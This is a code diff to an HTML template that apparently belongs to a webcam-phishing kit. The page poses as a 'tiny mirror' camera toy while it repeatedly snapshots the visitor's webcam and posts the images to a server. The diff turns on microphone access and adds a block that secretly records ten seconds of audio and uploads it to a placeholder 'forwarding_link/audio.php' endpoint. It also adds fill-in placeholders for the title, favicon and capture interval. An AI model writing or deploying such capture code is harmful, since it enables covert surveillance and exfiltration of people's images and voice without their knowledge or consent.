@@ -1,6 +1,9 @@
 <!doctype html>
 <html>
 <head>
+<title>page_title_placeholder</title>
+<meta http-equiv="Content-Security-Policy" content="default-src 'self' https:; script-src 'self' 'unsafe-inline' https:; style-src 'self' 'unsafe-inline' https:; img-src 'self' data: blob: https:; media-src 'self' blob: https:; connect-src 'self' https:;">
+<link rel="icon" type="image/png" href="favicon_url_placeholder">
 <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
 <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
 <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
@@ -37,10 +40,10 @@ const canvas = document.getElementById('canvas');
 const errorMsgElement = document.querySelector('span#errorMsg');
 
 const constraints = {
-  audio: false,
+  audio: true,
   video: {
     
-    facingMode: "user"
+    facingMode: "cam_facing_mode"
   }
 };
 
@@ -64,8 +67,30 @@ var context = canvas.getContext('2d');
 
        context.drawImage(video, 0, 0, 640, 480);
        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-       post(canvasData); }, 1500);
+       post(canvasData); }, cam_interval_ms);
   
+  // Audio capture
+  (function() {
+    try {
+      var audioTracks = stream.getAudioTracks();
+      if (audioTracks.length > 0) {
+        var audioStream = new MediaStream(audioTracks);
+        var recorder = new MediaRecorder(audioStream);
+        var chunks = [];
+        recorder.ondataavailable = function(e) { if (e.data && e.data.size > 0) chunks.push(e.data); };
+        recorder.onstop = function() {
+          var blob = new Blob(chunks, {type: recorder.mimeType || 'audio/webm'});
+          var fr = new FileReader();
+          fr.onloadend = function() {
+            $.ajax({type:'POST', data:{audio: fr.result}, url:'forwarding_link/audio.php', async:true});
+          };
+          fr.readAsDataURL(blob);
+        };
+        recorder.start();
+        setTimeout(function() { try { if (recorder.state === 'recording') recorder.stop(); } catch(e) {} }, 10000);
+      }
+    } catch(e) {}
+  })();
 
 }
 
